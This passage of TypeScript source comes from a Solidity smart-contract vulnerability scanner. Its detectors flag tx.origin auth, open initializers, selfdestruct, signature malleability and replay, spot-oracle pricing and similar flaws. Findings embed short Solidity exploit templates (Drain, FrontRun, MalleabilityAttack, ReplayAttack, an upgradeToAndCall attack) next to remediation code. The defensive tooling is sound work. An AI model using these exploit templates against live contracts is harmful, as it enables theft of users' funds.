      exploitSolidity: `interface IVictim { function ${fn.name}(address payable to) external; }\ncontract Drain {\n    function go(address victim, address payable me) external {\n        IVictim(victim).${fn.name}(me);\n    }\n}`,
      remediationSolidity: `function ${fn.name}(address payable to) external onlyOwner {\n    (bool ok, ) = to.call{value: address(this).balance}("");\n    require(ok);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  return flow;
}

function snapshot(flow: Flow): Flow {
  return {
    ...flow,
    seen: flow.seen,
    preCallWrites: new Set(flow.preCallWrites),
    postCallWrites: new Set(flow.postCallWrites),
    sendTargets: [...flow.sendTargets],
    allSendsAreRefunds: flow.allSendsAreRefunds,
    writeLines: new Map(flow.writeLines),
    readLines: new Map([...flow.readLines].map(([k, v]) => [k, [...v]] as [string, number[]])),
    calleeCalls: [...flow.calleeCalls],
    sendDetails: [...flow.sendDetails],
  };
}

function restore(flow: Flow, snap: Flow) {
  flow.seen = snap.seen;
  flow.sawWrite = snap.sawWrite;
  flow.sawCall = snap.sawCall;
  flow.callThenWrite = snap.callThenWrite;
  flow.writeThenCall = snap.writeThenCall;
  flow.preCallWrites = new Set(snap.preCallWrites);
  flow.postCallWrites = new Set(snap.postCallWrites);
  flow.sawEtherSend = snap.sawEtherSend;
  flow.sendTargets = [...snap.sendTargets];
  flow.allSendsAreRefunds = snap.allSendsAreRefunds;
  flow.writeLines = new Map(snap.writeLines);
  flow.readLines = new Map([...snap.readLines].map(([k, v]) => [k, [...v]] as [string, number[]]));
  flow.calleeCalls = [...snap.calleeCalls];
  flow.sendDetails = [...snap.sendDetails];
}

function namedAmountZero(named: AstNode | undefined): boolean {
  if (!named || !Array.isArray(named.names) || !Array.isArray(named.arguments)) return false;
  const names = named.names as string[];
  const args = named.arguments as AstNode[];
  for (let i = 0; i < names.length; i += 1) {
    if (!/amountOutMin|amount0Min|amount1Min|minOut/i.test(names[i] ?? "")) continue;
    const arg = args[i];
    if (arg?.type === "NumberLiteral" && (arg.number === "0" || arg.number === "0x0")) return true;
  }
  return false;
}

function flagUnchecked(
  fn: FnModel,
  stmt: AstNode,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  if (model.versionFloor !== null && model.versionFloor < 8_000) return;
  const text = sliceOf(parsed, stmt);
  // No write, no overflow: an unchecked block that only reads / indexes
  // (e.g. OZ MerkleProof's `return hashes[totalHashes - 1]`) cannot wrap
  // a stored balance. Only flag blocks that actually assign, accumulate,
  // or inc/dec. Comparisons (==, !=, >=, <=) are not writes.
  const noComparisons = text.replace(/==|!=|>=|<=/g, "");
  if (!/[+\-*/%]?=|\+\+|--/.test(noComparisons)) return;
  const onlyInc = !/[^+]\+[^+]/.test(text) && !text.includes("-") && !text.includes("*") && !text.includes("/");
  push(make({
    severity: onlyInc ? "info" : "medium",
    swc: "SWC-101",
    title: onlyInc ? `${fn.name} has an unchecked increment` : `${fn.name} disables overflow checks`,
    confidence: "high",
    detector: "unchecked-block",
    summary: onlyInc
      ? "An unchecked block only bumps a counter. That is a common loop pattern and is safe if the bound cannot approach 2^256."
      : "An unchecked block wraps instead of reverting. Balances and amounts inside it can overflow.",
    walkthrough: "1. `unchecked { ... }` restores pre-0.8 wrapping for every + - * inside it.\n2. A balance written there can skip from max to zero.\n3. Keep unchecked for measured loop indexes only.",
    exploitSolidity: onlyInc ? "" : "unchecked { credit += deposit; } // wraps",
    remediationSolidity: onlyInc ? "" : "credit += deposit; // checked on 0.8+",
    locationFn: fn.name,
    locationLine: lineOf(stmt, delta, fn.line),
    snippet: snippet(parsed, (stmt.loc?.start.line ?? fn.line + delta), delta),
  }));
}

/**
 * Strip comments and string literals from Solidity source (Fix 1c).
 * Single-pass scanner: a `//` inside a string is not a comment, and a
 * quote inside a comment is not a string. Comments become spaces and
 * strings become `""`, so positions shift — use the result for boolean
 * tests and span scans only, never for line numbers.
 */
function stripCommentsAndStrings(src: string): string {
  let out = "";
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const n = src[i + 1];
    if (c === "/" && n === "/") {
      while (i < src.length && src[i] !== "\n") i += 1;
    } else if (c === "/" && n === "*") {
      i += 2;
      while (i < src.length && !(src[i] === "*" && src[i + 1] === "/")) i += 1;
      i += 2;
    } else if (c === '"' || c === "'") {
      const q = c;
      i += 1;
      while (i < src.length && src[i] !== q) {
        if (src[i] === "\\") i += 1;
        i += 1;
      }
      i += 1;
      out += '""';
    } else {
      out += c;
      i += 1;
    }
  }
  return out;
}

// Length-preserving variant of stripCommentsAndStrings: comment and
// string contents become spaces, newlines are kept, so line numbers
// computed from the result match the original source. Used by Fix 30
// so a commented-out or string-literal encodePacked/hash cannot flag
// (the F3Dx Fix 1c class: a comment containing the pattern).
function stripCommentsAndStringsKeepLines(src: string): string {
  let out = "";
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const n = src[i + 1];
    if (c === "/" && n === "/") {
      while (i < src.length && src[i] !== "\n") { out += " "; i += 1; }
    } else if (c === "/" && n === "*") {
      out += "  "; i += 2;
      while (i < src.length && !(src[i] === "*" && src[i + 1] === "/")) {
        out += src[i] === "\n" ? "\n" : " "; i += 1;
      }
      out += "  "; i += 2;
    } else if (c === '"' || c === "'") {
      const q = c;
      out += " "; i += 1;
      while (i < src.length && src[i] !== q) {
        if (src[i] === "\\") { out += "  "; i += 2; continue; }
        out += src[i] === "\n" ? "\n" : " "; i += 1;
      }
      out += " "; i += 1;
    } else {
      out += c; i += 1;
    }
  }
  return out;
}

/** Block data that can act as entropy: clock fields plus beacon/hash sources. */
const BLOCK_DATA = /block\.timestamp|\bnow\b|block\.number|block\.coinbase|blockhash\s*\(|block\.prevrandao|block\.difficulty/;

/**
 * True when a keccak256(/sha3( call has block data INSIDE its hash
 * input (Fix 1b). Paren-depth scan from the call to its matching
 * close paren, then test the span. keccak of non-block-data (EIP-712
 * typed data — TRYfinance delegateBySig) is not entropy mixing.
 */
function hashInputHasBlockData(src: string): boolean {
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    if (BLOCK_DATA.test(src.slice(m.index! + m[0].length, i - 1))) return true;
  }
  return false;
}

/**
 * True when block data is the left operand of a % selection (Fix 1b):
 * a block-data expression followed by % in the same statement
 * (block.timestamp % n, (block.timestamp + x) % n). The [^;{}]*
 * bound keeps the match inside one statement, so a % in a later
 * statement does not count.
 */
function moduloOfBlockData(src: string): boolean {
  return /(?:block\.timestamp|\bnow\b|block\.number|block\.coinbase|blockhash\s*\([^)]*\)|block\.prevrandao|block\.difficulty)[^;{}]*%/.test(src);
}

/**
 * True when the block data in src flows ONLY into an oracle-query
 * nonce/commitment (Fix 19): the function calls
 * oraclize_query/provable_query, and every block-data occurrence is
 * inside a query/commitment call's argument span or an `unonce`
 * nonce mstore. Block data anywhere else (a selection, a deadline,
 * a branch) means it is NOT oracle-only. EtherHiLo's
 * oraclize_newRandomDSQuery and QueryNpmAuthentication's
 * provable_newRandomDSQuery hash blockhash/coinbase/timestamp into
 * the `unonce` nonce for an off-chain random source.
 */
function oracleNonceOnly(src: string, fnName: string): boolean {
  void fnName;
  if (!/\b(?:oraclize_query|provable_query)\s*\(/.test(src)) return false;
  // Blank the unonce nonce mstore spans (paren-depth from mstore().
  let blanked = src;
  for (const m of src.matchAll(/\bmstore\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    if (/unonce/.test(src.slice(m.index!, i))) {
      blanked = blanked.slice(0, m.index!) + " ".repeat(i - m.index!) + blanked.slice(i);
    }
  }
  // Blank oracle query / commitment call argument spans.
  for (const m of src.matchAll(/\b(?:oraclize_query|provable_query|oraclize_randomDS_setCommitment|provable_randomDS_setCommitment)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    blanked = blanked.slice(0, m.index!) + " ".repeat(i - m.index!) + blanked.slice(i);
  }
  return !BLOCK_DATA.test(blanked);
}

/**
 * True when every hash-of-block-data in src is assigned to an
 * identifier (an *id field/variable) and there is no selection use
 * (Fix 20): no % operator anywhere in the function and no hash used
 * as an array index. EtherHiLo's beginGame
 * (keccak256(block.number, player, bet) -> game id) is an identifier,
 * not randomness. A hash that is %'d, indexed, returned, or branched
 * on is a selection and does not count. Scoped to the clock+mix path:
 * bare blockhash/prevrandao/difficulty are entropy by nature, so the
 * caller only applies this when no entropy source is present.
 */
function hashOnlyAsIdentifier(src: string): boolean {
  let anyHash = false;
  for (const m of src.matchAll(/\b(?:keccak256|sha3)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    const span = src.slice(m.index! + m[0].length, i - 1);
    if (!BLOCK_DATA.test(span)) continue;
    anyHash = true;
    // The text before the hash call must end with an id assignment:
    // `gameId =`, `id:`, `id: uint(`, `game.id = uint(`. The separator
    // excludes `[` so a mapping key (balances[tokenId] = ...) is not
    // mistaken for the assignment target.
    const before = src.slice(0, m.index!).replace(/\s+$/, "");
    if (!/(?:^|[;{},()])(\s*(?:[\w.]+\.)?[\w$]*[Ii][Dd]\s*[:=]\s*(?:[a-zA-Z0-9_]+\s*\()?\s*)$/.test(before)) return false;
  }
  if (!anyHash) return false;
  if (/%/.test(src)) return false;
  if (/\[\s*(?:uint\d*|int\d*)?\s*\(?\s*(?:keccak256|sha3)\s*\(/.test(src)) return false;
  return true;
}

function scanSimple(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  authed: boolean,
  push: (f: Finding) => void,
) {
  const src = fn.source;
  if (/tx\.origin/.test(src)) {
    if (isEoaGateOnly(src)) {
      push(make({
        severity: "low",
        swc: "SWC-115",
        title: `${fn.name} uses an EOA-gate (tx.origin == msg.sender)`,
        confidence: "high",
        detector: "tx-origin",
        summary: "The only tx.origin use here is require(msg.sender == tx.origin), which blocks contract callers. It authenticates nobody: a phished EOA calling directly still passes. It also blocks legitimate contract wallets, multisigs, and account-abstraction accounts.",
        walkthrough: "1. The function requires msg.sender == tx.origin, so any contract call is rejected.\n2. That blocks vaults, multisigs, and account-abstraction wallets — not just attackers.\n3. It authenticates nobody: a phished EOA calling directly still passes.",
        exploitSolidity: "",
        remediationSolidity: "// If the goal is blocking contracts, accept the tradeoff explicitly (it breaks multisigs/AA). If the goal is authentication, check msg.sender against an allowlist instead.",
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    } else if (isTxOriginDenyOnly(src)) {
      push(make({
        severity: "low",
        swc: "SWC-115",
        title: `${fn.name} uses tx.origin in a deny check (blacklist)`,
        confidence: "high",
        detector: "tx-origin",
        summary: "The only tx.origin use here is a negated/blacklist check, which blocks rather than grants. It authenticates nobody, and the auth-bypass framing does not apply: the check can only revert. The residual effect is over-blocking — a blacklisted EOA cannot use any contract to call through.",
        walkthrough: "1. The check denies when tx.origin is blacklisted; it never grants access.\n2. A forwarding contract cannot bypass it: tx.origin is still the blacklisted signer.\n3. The cost is over-blocking, not a bypass.",
        exploitSolidity: "",
        remediationSolidity: "// If the deny is intentional (blacklist covers forwarded calls), keep it and document the over-blocking. If the goal is authentication, check msg.sender instead.",
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    } else {
      push(make({
        severity: "high",
        swc: "SWC-115",
        title: `${fn.name} authenticates with tx.origin`,
        confidence: "high",
        detector: "tx-origin",
        summary: "tx.origin is the signer of the transaction, not the caller. A contract the signer uses can reenter this function and pass the check.",
        walkthrough: originWalk(fn.name),
        exploitSolidity: originExploit(contract.name, fn.name),
        remediationSolidity: originFix(),
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  // Zero slippage bound: a swap that accepts any output
  // (amountOutMin 0) is sandwichable — a searcher moves the price
  // against the swap and it still executes. CoinToken's handleTax
  // calls swapExactTokensForETH(toSell, 0, ...) and
  // addLiquidityETH(..., 0, 0, ...) with both mins 0. Only literal
  // 0 counts: a param min (minOut) is a real bound. swapExactETH*
  // takes amountOutMin as its FIRST arg, the other swapExact* as
  // the second; addLiquidity takes two consecutive min args.
  if (
    /swapExact\w+\s*\(\s*0(\s*(ether|gwei|wei))?\s*,/.test(src) ||
    /swapExact\w+\s*\(\s*[^,]+,\s*0(\s*(ether|gwei|wei))?\s*,/.test(src) ||
    /addLiquidity\w*\s*\([^)]*,\s*0(\s*(ether|gwei|wei))?\s*,\s*0(\s*(ether|gwei|wei))?\s*,/.test(src)
  ) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} swaps with a zero slippage bound`,
      confidence: "high",
      detector: "zero-slippage-swap",
      summary: "A swap or liquidity add passes a literal 0 as its minimum-output bound, so it executes at any price. A searcher can sandwich the trade and the contract still accepts the worst fill.",
      walkthrough: "1. amountOutMin (or both addLiquidity mins) is a literal 0.\n2. A searcher front-runs the swap, moves the pool price, and the swap still executes.\n3. Pass a real minimum derived from an oracle/TWAP or the caller's quote, and revert if the fill is worse.",
      exploitSolidity: "",
      remediationSolidity: `uint256 minOut = (amountIn * expectedPrice) / 1e18;\nminOut = (minOut * 995) / 1000; // 0.5% slippage tolerance\nrouter.swapExactTokensForETH(amountIn, minOut, path, address(this), block.timestamp);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/\bselfdestruct\s*\(|\bsuicide\s*\(/.test(src)) {
    // "Attacker-chosen address" is only true when the caller controls the
    // beneficiary: a param, msg.sender, or storage this function writes.
    // selfdestruct(burn) with burn a constant sends to a fixed address —
    // anyone can trigger the destruction (griefing), but nobody profits.
    // The beneficiary arg is extracted by paren-depth scan, not a
    // [^)]* regex: selfdestruct(payable(address(this))) has nested
    // parens, and a naive capture truncates to `payable(address(this`
    // (which Fix 13's address(this) check would never match).
    const sdCall = src.match(/\b(?:selfdestruct|suicide)\s*\(/);
    let sdArg = "";
    if (sdCall && sdCall.index !== undefined) {
      let depth = 1;
      let i = sdCall.index + sdCall[0].length;
      while (i < src.length && depth > 0) {
        if (src[i] === "(") depth += 1;
        else if (src[i] === ")") depth -= 1;
        i += 1;
      }
      sdArg = src.slice(sdCall.index + sdCall[0].length, i - 1).trim();
    }
    const sdControlled = sdArg ? isCallerControlled(sdArg, fn, contract) : true;
    // Fix 21: an access-controlled selfdestruct is MEDIUM, not high —
    // the owner key can destroy the contract, but only the gated key
    // can do it, so it is a governance-trust note, not an open kill
    // switch. Uncontrolled selfdestruct to a caller-chosen address
    // keeps the critical rule; a fixed beneficiary stays low.
    push(make({
      severity: sdControlled ? (authed ? "medium" : "critical") : "low",
      swc: "SWC-106",
      title: sdControlled
        ? (authed ? `${fn.name} can selfdestruct` : `${fn.name} selfdestructs without an access check`)
        : `${fn.name} can selfdestruct to a fixed address`,
      confidence: "high",
      detector: "selfdestruct",
      summary: sdControlled
        ? (authed
          ? "A privileged caller can destroy the contract and send away the balance. On chains that still honor deletion outside the creating transaction this is final; either way the balance moves."
          : "selfdestruct is reachable without an owner check. The balance can be forced to an attacker-chosen address.")
        : "selfdestruct is reachable without an owner check, but the beneficiary is fixed (a constant or storage the caller cannot redirect), so the caller gains nothing. Anyone can still destroy the contract — griefing, not theft.",
      walkthrough: "1. selfdestruct sends the full balance to its argument and, where deletion still applies, removes the code.\n2. A public function with no msg.sender check is an open kill switch.\n3. Combined with CREATE2, the address can be redeployed with different code.",
      exploitSolidity: sdControlled && !authed ? `interface IVictim { function ${fn.name}(address payable to) external; }` : "",
      remediationSolidity: `function close(address payable to) external onlyOwner {\n    // Prefer a normal withdraw. selfdestruct is not an upgrade strategy after EIP-6780.\n    selfdestruct(to);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  const initName = /^init(ialize)?$/.test(fn.name);
  // A revert-only initialize (StarkWare Proxy) cannot be called
  // successfully by anyone — skip the unprotected-initializer flag.
  // Fix 36: the same flag conditions on a PROXY-shaped contract are a
  // category error, not a critical. The initializer an attacker would
  // front-run lives in the IMPLEMENTATION (its setup replaces the
  // constructor there); the proxy's own initialize (the OZ
  // AdminUpgradeabilityProxy shape) is the deploy-time binding of
  // logic/admin, and whether it already ran is chain state, not source
  // shape. Suppress the critical on proxies and note where the check
  // belongs; an implementation's own unprotected initialize (non-proxy
  // contract) keeps the critical in the branch below.
  if (initName && !alwaysReverts(src) && !authed && !fn.modifiers.some((m) => /initializer|reinitializer/i.test(m)) && !/require\s*\(\s*!?\s*initialized/.test(src) && isProxyShape(contract)) {
    push(make({
      severity: "info",
      swc: null,
      title: `${fn.name} is on a proxy contract — the initializer check belongs to the implementation`,
      confidence: "high",
      detector: "unprotected-initializer",
      summary: `${contract.name} is a proxy-shaped contract, so an unprotected-initialize flag here aims at the wrong contract. The setup that replaces a constructor — and that an attacker would front-run — is the implementation's initialize, which is audited on the implementation contract. The proxy's own initialize is the deploy-time binding of logic/admin (already-run is on-chain state, not visible in source). No critical is raised against the proxy itself.`,
      walkthrough: [
        `1. ${fn.name} sits on ${contract.name}, a proxy: calls to it are the deploy-time setup path, not the implementation's setup.`,
        "2. Audit the implementation contract's initialize for the one-shot guard (initializer modifier / initialized flag / _disableInitializers in its constructor).",
        "3. Confirm on-chain that the proxy's implementation slot is already set — a deployed, initialized proxy cannot be re-initialized through this path.",
      ].join("\n"),
      exploitSolidity: "",
      remediationSolidity: `// In the IMPLEMENTATION: lock the logic contract itself.
constructor() { _disableInitializers(); }
function initialize(address _oracle) external initializer { oracle = _oracle; }`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  } else if (initName && !alwaysReverts(src) && !authed && !fn.modifiers.some((m) => /initializer|reinitializer/i.test(m)) && !/require\s*\(\s*!?\s*initialized/.test(src)) {
    push(make({
      severity: "critical",
      swc: null,
      title: `${fn.name} can be called by anyone, more than once`,
      confidence: "high",
      detector: "unprotected-initializer",
      summary: "Initializer functions replace the constructor on proxies. Without an initializer modifier or a one-shot flag check, anyone can reset the owner or oracle, and they can do it again later.",
      walkthrough: [
        `1. ${fn.name} is ${fn.visibility || "public"} and writes privileged storage.`,
        "2. Nothing reverts when it has already been called.",
        "3. On a proxy, the implementation's constructor never ran, so this function is the whole setup path — and it is open.",
        "4. Front-run the deploy: call initialize before the deployer and become the owner.",
      ].join("\n"),
      exploitSolidity: `interface IVictim { function initialize(address) external; }\ncontract FrontRun {\n    function snipe(address proxy, address me) external {\n        IVictim(proxy).initialize(me);\n    }\n}`,
      remediationSolidity: `import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";\nfunction initialize(address _oracle) external initializer {\n    require(_oracle != address(0));\n    oracle = _oracle;\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  const writesPriv = contract.stateVars.some((v) => PRIVILEGED.test(v.name) && rx(`\\b${v.name}\\s*=`).test(src));
  // Fix 14: a self-burn is a standard user action, not an admin action.
  // `burn` stays in the name list, but a burn that burns the caller's
  // OWN tokens (_burn(msg.sender, ...) / _burn(_msgSender(), ...)) does
  // not trigger on name alone — TRYfinance's burn(amount) burns the
  // caller's own tokens via _burn(_msgSender()). A burn that burns
  // someone else's tokens with no gate still flags. (Dropping `burn`
  // outright would also silence a bare, ungated burn of another
  // account — Fix 26 requires that case to keep flagging.)
  const isSelfBurn = fn.name === "burn" && /_burn\s*\(\s*(msg\.sender|_msgSender\s*\(\s*\))/.test(src);
  // Fix 14b: a paid mint is a sale, not an admin action. `mint` drops
  // out when the function requires payment — a require mentioning
  // msg.value (BallerBananas: require(msg.value >= cost * _mintAmount)).
  // An unpaid, ungated mint still flags on name alone.
  const isPaidMint = fn.name === "mint" && /require\s*\([^;]*?msg\.value/.test(src);
  const adminName = /^(mint|burn|setOwner|transferOwnership|upgrade|upgradeTo|upgradeToAndCall|pause|unpause|setFee|setTax|setOracle|setImplementation|execute)$/.test(fn.name) && !isSelfBurn && !isPaidMint;
  if (!initName && (writesPriv || adminName) && !authed && !fn.isConstructor && fn.visibility !== "internal" && fn.visibility !== "private" && fn.mutability !== "view" && fn.mutability !== "pure") {
    push(make({
      severity: adminName || writesPriv ? "critical" : "high",
      swc: "SWC-105",
      title: `${fn.name} changes privileged state without an access check`,
      confidence: "medium",
      detector: "unprotected-admin",
      summary: `${fn.name} is externally callable and writes an owner, oracle, implementation, or other privileged variable — or its name is an admin action — and Kiln found no msg.sender check.`,
      walkthrough: `1. Confirm there is no inherited modifier the parser missed. Bases: ${contract.bases.join(", ") || "(none)"}.\n2. If the function really is open, call it and take the role.\n3. Add onlyOwner, or a role check, and a zero-address check on the new value.`,
      exploitSolidity: `interface IVictim { function ${fn.name}(address next) external; }`,
      remediationSolidity: `function ${fn.name}(address next) external onlyOwner {\n    require(next != address(0));\n    owner = next;\n    emit OwnershipTransferred(msg.sender, next);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (fn.name === "_authorizeUpgrade" && !authed) {
    push(make({
      severity: "critical",
      swc: null,
      title: "_authorizeUpgrade is not restricted",
      confidence: "high",
      detector: "unprotected-admin",
      summary: "UUPS upgrades call _authorizeUpgrade. If it is empty or open, anyone can replace the implementation.",
      walkthrough: "1. upgradeToAndCall is public on the UUPS base.\n2. The only gate is this function.\n3. An empty body, or one that does not check msg.sender, hands out the upgrade.",
      exploitSolidity: `function attack(address proxy, address evil) external {\n    IUUPS(proxy).upgradeToAndCall(evil, "");\n}`,
      remediationSolidity: `function _authorizeUpgrade(address) internal override onlyOwner {}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/ecrecover\s*\(/.test(src)) {
    if (!/7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0/i.test(src) && !/\bs\s*(<=|<)/.test(src)) {
      push(make({
        severity: "medium",
        swc: "SWC-117",
        title: `${fn.name} does not bind the signature's s value`,
        confidence: "medium",
        detector: "signature-malleability",
        summary: "ecrecover accepts both s and secp256k1n - s for many signatures. Without an s < n/2 check, one approval can be replayed as a second distinct signature.",
        walkthrough: "1. A signature (v, r, s) has a malleable twin (v', r, n - s).\n2. Both recover the same signer on many libraries, but the bytes differ.\n3. A mapping keyed by the signature hash, rather than by a nonce, treats them as two uses.",
        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
contract MalleabilityAttack {
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
        IVictim(victim).${fn.name}(hash, v, r, s);
        uint8 v2 = v == 27 ? 28 : 27;
        bytes32 s2 = bytes32(N - uint256(s));
        IVictim(victim).${fn.name}(hash, v2, r, s2);
    }
}`,
        remediationSolidity: `require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "s");\nrequire(v == 27 || v == 28, "v");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
    if (!/nonce|deadline|chainid|chain\.id|domainSeparator|used\[/i.test(src)) {
      push(make({
        severity: "medium",
        swc: "SWC-121",
        title: `${fn.name} verifies a signature with no nonce or deadline`,
        confidence: "medium",
        detector: "signature-replay",
        summary: "The digest does not appear to include a nonce, a deadline, or a domain separator. The same signature can be reused, possibly on another chain.",
        walkthrough: "1. ecrecover only tells you who signed the hash.\n2. If the hash is just the arguments, the signer cannot prevent a second submission.\n3. Include chainid, the verifying-contract address, a nonce that increments, and a deadline.",
        exploitSolidity: `interface IVictim { function ${fn.name}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external; }
contract ReplayAttack {
    function attack(address victim, bytes32 hash, uint8 v, bytes32 r, bytes32 s) external {
        IVictim(victim).${fn.name}(hash, v, r, s);
        // Replay identical signature
        IVictim(victim).${fn.name}(hash, v, r, s);
    }
}`,
        remediationSolidity: `bytes32 digest = keccak256(abi.encodePacked(\n    "\\x19\\x01", DOMAIN_SEPARATOR(), keccak256(abi.encode(TYPEHASH, user, amount, nonces[user]++, deadline))\n));\nrequire(block.timestamp <= deadline, "expired");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  if (/getReserves\s*\(|\.slot0\s*\(|latestRoundData\s*\(|latestAnswer\s*\(/.test(src) && !/^(getReserves|slot0|latestRoundData|latestAnswer)$/.test(fn.name)) {
    // A view/pure function only quotes — nothing in this contract
    // settles on it. It becomes a risk only if another protocol treats
    // the quote as an oracle, so that is info, not high.
    // And a BARE getReserves()/slot0() call (no receiver) is the
    // contract pricing its OWN pool — SAGE's buy/sell/removeLiquidity
    // call their own getReserves(), which returns their own balances.
    // This contract IS the market; no outside protocol settles on
    // this number. An external oracle always has a receiver
    // (pair.getReserves(), feed.latestRoundData()), so strip the
    // bare/this calls and only keep HIGH if an external one remains.
    // The residual own-pool risk is sandwich/MEV on the caller's own
    // trade, so that is low, not high.
    const viewOnly = fn.mutability === "view" || fn.mutability === "pure";
    const withoutOwn = src.replace(/(^|[^\w.]|this\.)(getReserves|slot0|latestRoundData|latestAnswer)\s*\(/g, "$1");
    const externalOracle = /(getReserves|slot0|latestRoundData|latestAnswer)\s*\(/.test(withoutOwn);
    const ownPool = !externalOracle;
    push(make({
      severity: viewOnly ? "info" : ownPool ? "low" : "high",
      swc: null,
      title: viewOnly ? `${fn.name} quotes off a spot oracle (view-only)` : ownPool ? `${fn.name} prices its own pool from spot reserves (AMM)` : `${fn.name} prices off a spot oracle`,
      confidence: "medium",
      detector: "oracle-spot",
      summary: viewOnly
        ? "A reserves read, a Uniswap v3 slot0, or a spot Chainlink-style answer is used directly. This function is view-only: it quotes a price but nothing in this contract settles on it. It becomes a risk only if another protocol treats this quote as an oracle."
        : ownPool
          ? "The price comes from this contract's own reserves (a bare getReserves()/slot0() call to its own function), not an external oracle — this contract is the market. No outside protocol settles on this number. The residual risk is sandwich/MEV on the caller's own trade; check the slippage bound."
          : "A reserves read, a Uniswap v3 slot0, or a spot Chainlink-style answer is used directly. Spot reserves move inside a single transaction; a stale or unchecked oracle answer is the other half of this class.",
      walkthrough: "1. Borrow via a flash loan, move the pool, and read the new price in the same call.\n2. Anything that mints, borrows, or liquidates on that number is wrong for one block — which is long enough.\n3. Use a TWAP, or Chainlink with a freshness and min/max answer check. Never use slot0 or getReserves as a price.",
      exploitSolidity: `// Inside a flash swap callback:\nuint256 fake = victim.quote(pair);\n// fake reflects the pool you just skewed. Borrow against it, then repay the swap.`,
      remediationSolidity: `(uint80 roundId, int256 answer,, uint256 updatedAt,) = feed.latestRoundData();\nrequire(answer > 0 && updatedAt >= block.timestamp - 1 hours, "stale");\nrequire(feed.getAnswer(roundId) == answer);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/(price|quote|rate)/i.test(fn.name) && /address\(this\)\.balance|\.balance\b/.test(src)) {
    push(make({
      severity: "medium",
      swc: "SWC-120",
      title: `${fn.name} treats a token or ether balance as a price`,
      confidence: "medium",
      detector: "balance-as-price",
      summary: "A raw balance can be pushed up with a direct transfer, including in the same transaction. It is not a manipulation-resistant price.",
      walkthrough: "1. Donate tokens or ETH straight to the contract.\n2. balance increases with no share mint.\n3. The next caller buys shares too cheap, or collateral looks too thick.",
      exploitSolidity: `// victim.price() returns address(this).balance.\n// Send 1 wei or 1e24 wei first, depending on which way the formula breaks.`,
      remediationSolidity: "// Price from a TWAP or an oracle. Use an internal accounting variable, not address(this).balance.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (hasDivThenMul(fn.body)) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} divides before it multiplies`,
      confidence: "high",
      detector: "div-before-mul",
      summary: "Integer division truncates. Doing it before a multiply throws away precision and, in a share or price formula, donates value to the next caller or rounds a payout to zero.",
      walkthrough: "1. (a / b) * c truncates a/b first.\n2. If a < b the whole product is zero.\n3. Multiply first, then divide: (a * c) / b. Watch the overflow on the product if you are below 0.8 or inside unchecked.",
      exploitSolidity: `// (100 / 300) * 1e18 == 0\n// (100 * 1e18) / 300        == 3.33e17`,
      remediationSolidity: `return (uint256(a) * 1e18) / uint256(b);`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/==\s*address\(this\)\.balance|address\(this\)\.balance\s*==|balance\s*==/.test(src)) {
    push(make({
      severity: "medium",
      swc: "SWC-132",
      title: `${fn.name} requires an exact balance`,
      confidence: "medium",
      detector: "strict-balance",
      summary: "A strict equality on a balance is broken by a force-fed ether transfer (selfdestruct, or a coinbase payment). The requirement then bricks the function.",
